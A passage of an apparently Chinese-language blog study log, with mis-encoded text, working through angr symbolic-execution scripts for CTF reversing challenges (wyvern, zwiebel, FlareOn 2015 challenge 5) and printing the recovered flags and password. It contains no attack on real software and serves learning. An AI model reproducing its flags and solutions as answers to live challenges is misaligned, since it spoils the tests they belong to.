            <span class="token keyword">return</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> guess_str <span class="token keyword">in</span> s<span class="token punctuation">,</span> stdout<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="CSAW-CTF-2015-Quals-Reversing-500-â€œwyvernâ€-DONE"><a href="#CSAW-CTF-2015-Quals-Reversing-500-â€œwyvernâ€-DONE" class="headerlink" title="CSAW CTF 2015 Quals - Reversing 500, â€œwyvernâ€ |DONE"></a>CSAW CTF 2015 Quals - Reversing 500, â€œwyvernâ€ |DONE</h3><blockquote>
<p>Script author: Audrey Dutcher (github: @rhelmot)</p>
<p>Script runtime: 15 mins</p>
<p>Concepts presented: stdin constraining, concrete optimization with Unicorn</p>
</blockquote>
<p>é€šè¿‡ gdb è°ƒè¯•å¾—çŸ¥ï¼ˆå®åœ¨æ˜¯å¯¹ CPP ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºäº†è§£æ¯”è¾ƒå°‘ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_23-26-09.jpg" alt="Snipaste_2021-07-28_23-26-09"></p>
<p>å¤§èƒ†çŒœæµ‹å­—ç¬¦é•¿åº¦</p>
<p><img src="file:///C:/Users/UserUnknow/Desktop/picture/Snipaste_2021-07-28_23-26-26.jpg" alt="Snipaste_2021-07-28_23-26-26"></p>
<p>è¿™é“é¢˜å’Œç¬¬ä¸€é“é¢˜å¾ˆæƒ³ï¼Œæˆ‘æ‰“ç®—æ ¹æ®ç›®å‰æ‰€å­¦å†™ä¸¤ä¸ªè„šæœ¬</p>
<h4 id="sm-run"><a href="#sm-run" class="headerlink" title="sm.run()"></a>sm.run()</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># .virtualenvs/angr</span>
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./wyvern'</span><span class="token punctuation">)</span>

    <span class="token comment"># [INFO]0x4046FE  v5 = std::string::length(v10) - 1LL != legend >> 2; </span>
    length <span class="token operator">=</span> <span class="token number">28</span>
    <span class="token comment"># åˆ›å»ºç¬¦å·</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span> i <span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars <span class="token operator">+</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"./wyvern"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        add_options<span class="token operator">=</span>angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>unicorn<span class="token punctuation">,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">></span><span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> sm<span class="token punctuation">.</span>deadended<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">b'success'</span> <span class="token keyword">in</span> i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token punctuation">,</span>i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="sm-explore"><a href="#sm-explore" class="headerlink" title="sm.explore()"></a>sm.explore()</h4><p>æƒ³æ¥äºŒè€…åº”è¯¥æ—¶å·®ä¸å¤šçš„ï¼Œå…·ä½“ç»†èŠ‚æœ‰å¾…ç ”ç©¶å­¦ä¹ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># .virtualenvs/angr/bin/python</span>
<span class="token keyword">import</span> time
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./wyvern"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x400F10</span><span class="token punctuation">,</span>angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'glibc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    length <span class="token operator">=</span> <span class="token number">28</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span> i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars <span class="token operator">+</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\b'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"./wyvern"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        add_options<span class="token operator">=</span>angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>unicorn<span class="token punctuation">,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">></span><span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    before <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x40E2BD</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x40E37A</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unstash<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'found'</span><span class="token punctuation">,</span>to_stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">)</span>
    after  <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># IPython.embed()</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>active<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>active<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Time : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>after<span class="token operator">-</span>before<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="TUMCTF-2016-zwiebel-DONE"><a href="#TUMCTF-2016-zwiebel-DONE" class="headerlink" title="TUMCTF 2016 - zwiebel |DONE"></a>TUMCTF 2016 - zwiebel |DONE</h3><blockquote>
<p>Script author: Fish<br>Script runtime: 2 hours 31 minutes with pypy and Unicorn - expect much longer with CPython only<br>Concepts presented: self-modifying code support, concrete optimization with Unicorn</p>
</blockquote>
<p>æœ‰æ„æ€ <strong>self-modifying</strong> è¿™ä¸ªæ­£å¥½æ˜¯æˆ‘ä¹‹å‰æƒ³çš„ï¼Œé‡åˆ°è¿™ç§æƒ…å†µåº”è¯¥æ€ä¹ˆåšã€‚å½“æ—¶ç”±äºå¯¹ç¬¦å·æ‰§è¡Œçš„ä¸€äº›ç»†èŠ‚ä¸äº†è§£ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ‰‹åŠ¨ patch ä¸€ä¸‹ç¨‹åº ï¼Œç„¶åå†æ ¹æ®ç¬¦å·æ‰§è¡Œã€‚ä¸è¿‡ç°åœ¨çœ‹æ¥ï¼Œæ ¹æœ¬ä¸ç”¨æ‰‹åŠ¨ï¼Œè¿™äº›å¯ä»¥æœ‰æ›´æ–¹ä¾¿çš„åšæ³•ã€‚</p>
<p>è„šæœ¬æ¯”è¾ƒç®€å•ï¼Œä¸»è¦çš„è¦ç‚¹å°±æ˜¯åœ¨ç¨‹åºè‡ªå·±è§£å¯†ï¼ˆself-unpackingï¼‰çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥ä½¿ç”¨ unicorn ï¼Œä¼¼ä¹å’Œ qemu æœ‰å…³ï¼Œemm æŒºåº•å±‚çš„ä¸œè¥¿ï¼Œ<strong>MARK</strong> ä¸€ç•ªï¼Œå¦å¤–å°±æ˜¯ç”±äºç¨‹åºç”±äºç¨‹åºå¯èƒ½èµ°å‘éçº¦æŸçš„è§£ã€‚æ‰€ä»¥æå‰ hook äº†ä¸€ä¸ªå‡½æ•°ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'ptrace'</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'stubs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ReturnUnconstrained'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>return_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># è¿™ä¸ª 20 ä¸ª deadended æ˜¯å¦æ˜¯è®¡ç®—å‡ºæ¥çš„å‘¢ï¼Œemmï¼Œä¸æ¸…æ¥šä¸è¿‡å¾ˆå·§</span>
sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span>n<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>å…¶å®ä¹Ÿå¯ä»¥ç”¨ explore ä»¥æ­£å¸¸ç»“æŸä¸º find çŒœæµ‹æ‰€æœ‰ä¸ç¬¦åˆçš„ flag è¾“å…¥åéƒ½æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç¦»å¼€çš„ç¨‹åºï¼Œæ€»ä¹‹æ–¹æ³•å¤šæ ·ï¼Œè¿™ä¸ªæ ·ä¾‹ç”¨æ¥æµ‹è¯•å¾ˆå¥½ã€‚ç”±äºä¸çŸ¥é“ä½¿ç”¨äº†å¤šå°‘ç¬¦å·ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰è‡ªå·±åˆ›å»ºä¸€å®šæ•°é‡çš„ç¬¦å·ï¼ˆæ€»ä¹‹ä¸€åˆ‡äº¤ç»™ angr ï¼‰ğŸ¤£</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># load process</span>
    
    <span class="token comment"># hook unconstrained function è¿™ä¸ªåº”è¯¥æ˜¯çœ‹ç»éªŒçš„ï¼Œè¦ä¹ˆå°±å»é­”æ”¹ä¸€ä¸‹æ‰§è¡Œçš„å‡½æ•°</span>
    
    <span class="token comment"># init SimState</span>
    
    <span class="token comment"># symbol execute</span>
    
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># sm.stashes</span>
    
    <span class="token keyword">return</span> flag
    
    <span class="token comment"># TODO</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p># Here is the output (after 2 hours and 31 minutes on my machine running Pypy):</p>
<p>#</p>
<p># ipdb&gt; print(sm)</p>
<p># &lt;PathGroup with 20 errored, 21 deadended&gt;</p>
<p># ipdb&gt; print(sm.deadended[-1])</p>
<p># &lt;Path with 160170 runs (at 0x20001e0)&gt;</p>
<p># ipdb&gt; print(sm.deadended[-1].state.posix.dumps(0))</p>
<p># hxp{1_h0p3_y0u_d1dnt_p33l_th3_0ni0n_by_h4nd}</p>
<p># :)</p>
</blockquote>
<p>çœŸè¦æ‰“æ¯”èµ›è¿˜å¾—çœ‹ä¼˜åŒ–:person_fencing: , çœ‹æ¥è¿™ä¸ªè„šæœ¬çš„ä½œè€…æœºå­ä¸å¤§è¡Œã€‚åœ¨æ²¡æœ‰ç®¡éçº¦æŸçš„ä¸€äº›å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œæˆ‘æ‰§è¡Œäº† 25min å·®ä¸å¤šã€‚æ„Ÿè§‰è¿˜æ˜¯é¢˜ç›®çš„åŠ è§£å¯†æ¯”è¾ƒç®€å•ã€‚</p>
<h3 id="FlareOn-2015-Challenge-5-DONE"><a href="#FlareOn-2015-Challenge-5-DONE" class="headerlink" title="FlareOn 2015 - Challenge 5 |DONE"></a>FlareOn 2015 - Challenge 5 |DONE</h3><blockquote>
<p>Script author: Adrian Tang (github: @tangabc)<br>Script runtime: 2 mins 10 secs<br>Concepts presented: Windows support</p>
</blockquote>
<p>æœ‰å…³è¿™ä¸ªé¢˜ç›®æœ¬èº«è¿™ä¸ª HASH å€¼æ€ä¹ˆå¾—å‡ºæ¥çš„æˆ‘æ˜¯ä¸€å¤´é›¾æ°´ï¼ˆæ²¡æœ‰åŠ¨è°ƒè¿‡ï¼‰ã€‚æ‰€ä»¥æš‚ä¸”å°±ä¸å…³æ³¨è¿™ä¸ª HASH äº†ã€‚ä¼°è®¡æ˜¯ä»ç»™çš„åŒ…é‡Œé¢æå–å‡ºæ¥çš„ã€‚</p>
<p>è¿™ä¸ªè„šæœ¬æœ‰æ„æ€çš„åœ°æ–¹åœ¨äºæŠŠæ ˆå †ç»™ç¬¦å·åŒ–äº†ï¼Œç„¶åä¸€é€šæ‰§è¡Œåˆ°ç¨‹åºåˆ°å…³é”®å‡½æ•°ç»“æŸåã€‚æ·»åŠ çº¦æŸå†æ±‚è§£çš„è¿‡ç¨‹ã€‚æ¯”è¾ƒå·§å¦™çš„è§£å†³äº†ä¸€ç§å·²çŸ¥ç»“æœä½†æ˜¯åˆå§‹å€¼æœªçŸ¥ï¼ˆæ±‚è§£å¼•æ“è´Ÿè´£ï¼‰çš„é€†å‘é¢˜ç›®ã€‚</p>
<p>ä»¥ä¸‹ä¸ºè‡ªå·±çº¯çº¯çš„ copyï¼Œä¸‹æ¬¡è‡ªå·±å†™ï¼Œæˆ–è€…äº†è§£æ·±äº†å†ä¼˜åŒ–ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
Full writeup of the walkthrough:
http://0x0atang.github.io/reversing/2015/09/18/flareon5-concolic.html
"""</span>
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr


<span class="token comment"># Globals</span>
LEN_PW <span class="token operator">=</span> <span class="token number">0x22</span>
ADDR_PW_ORI <span class="token operator">=</span> ADDR_PW_ENC <span class="token operator">=</span> ADDR_HASH <span class="token operator">=</span> <span class="token number">0</span>
GOAL_HASH <span class="token operator">=</span> <span class="token string">'UDYs1D7bNmdE1o3g5ms1V6RrYCVvODJF1DpxKTxAJ9xuZW=='</span>


<span class="token keyword">def</span> <span class="token function">hook_duplicate_pw_buf</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>LEN_PW<span class="token punctuation">)</span><span class="token punctuation">:</span>
        char_ori <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>ADDR_PW_ENC <span class="token operator">+</span> i<span class="token punctuation">,</span> char_ori<span class="token punctuation">)</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> ADDR_PW_ENC

<span class="token keyword">def</span> <span class="token function">hook_use_dup_pw_buf</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ecx <span class="token operator">=</span> ADDR_PW_ENC

<span class="token keyword">def</span> <span class="token function">hook_heapalloc</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> ADDR_HASH


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> ADDR_PW_ORI<span class="token punctuation">,</span> ADDR_PW_ENC<span class="token punctuation">,</span> ADDR_HASH

    <span class="token comment"># Load binary</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span>

    <span class="token comment"># Start with a blank state at the EIP after "key.txt" is read</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401198</span><span class="token punctuation">)</span>

    <span class="token comment"># Initialize global variables</span>
    ADDR_PW_ORI <span class="token operator">=</span> state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">-</span> <span class="token number">0x80004</span>
    ADDR_PW_ENC <span class="token operator">=</span> ADDR_PW_ORI <span class="token operator">+</span> <span class="token number">0x10000</span> <span class="token comment"># çœ‹ä¸Šå»å°±æ˜¯éšä¾¿æ‰¾äº†ä¸€ä¸ªåœ°æ–¹å­˜äº†</span>
    ADDR_HASH <span class="token operator">=</span> state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">-</span> <span class="token number">0x40000</span>

    <span class="token comment"># Setup stack to simulate the state after which the "key.txt" is read</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esi <span class="token operator">=</span> LEN_PW
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>LEN_PW<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>mem<span class="token punctuation">[</span>ADDR_PW_ORI<span class="token operator">+</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>byte <span class="token operator">=</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'pw'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>

    <span class="token comment"># Hook instructions to use a separate buffer for the XOR-ing function</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401259</span><span class="token punctuation">,</span> hook_duplicate_pw_buf<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4011E7</span><span class="token punctuation">,</span> hook_use_dup_pw_buf<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment"># To avoid calling imports (HeapAlloc), retrofit part of the stack as </span>
    <span class="token comment"># temporary buffer to hold symbolic copy of the password</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4011D6</span><span class="token punctuation">,</span> hook_heapalloc<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>

    <span class="token comment"># Explore the states until after the hash is computed</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4011EC</span><span class="token punctuation">)</span>

    <span class="token comment"># Add constraints to make final hash equal to the one we want</span>
    <span class="token comment"># Also restrict the hash to only printable bytes</span>
    found_s <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>GOAL_HASH<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        char <span class="token operator">=</span> found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_HASH <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        found_s<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>char <span class="token operator">>=</span> <span class="token number">0x21</span><span class="token punctuation">,</span>
                                char <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">,</span>
                                char <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>GOAL_HASH<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Solve for password that will result in the required hash</span>
    <span class="token keyword">return</span> found_s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
          found_s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> LEN_PW<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'Sp1cy_7_layer_OSI_dip@flare-on.com'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="0ctf-quals-2016-trace-â€”â€”"><a href="#0ctf-quals-2016-trace-â€”â€”" class="headerlink" title="0ctf quals 2016 - trace | â€”â€”-"></a>0ctf quals 2016 - trace | â€”â€”-</h3><blockquote>
<p>Script author: WGH (<a href="mailto:wgh@bushwhackers.ru">wgh@bushwhackers.ru</a>)<br>Script runtime: 1 min 50 secs (CPython 2.7.10), 1 min 12 secs (PyPy 4.0.1)<br>Concepts presented: guided symbolic tracing</p>
</blockquote>
<p>MIPS æ±‡ç¼–ä¸ä¹ æƒ¯ï¼Œä¸‹æ¬¡ä¸€å®š</p>
<h3 id="ASIS-CTF-Finals-2015-license"><a href="#ASIS-CTF-Finals-2015-license" class="headerlink" title="ASIS CTF Finals 2015 - license | ??????"></a>ASIS CTF Finals 2015 - license | ??????</h3><blockquote>
<p>Script author: Fish Wang (github: @ltfish)<br>Script runtime: 3.6 sec<br>Concepts presented: using the filesystem, manual symbolic summary execution</p>
</blockquote>
<p>æˆ‘å†™çš„è„šæœ¬æ‰§è¡Œä¸ä¸‹å»ï¼Œå†…å­˜å æ»¡äº†éƒ½ï¼Œæš‚æ—¶ä¸æ¸…æ¥šåŸå› ã€‚</p>
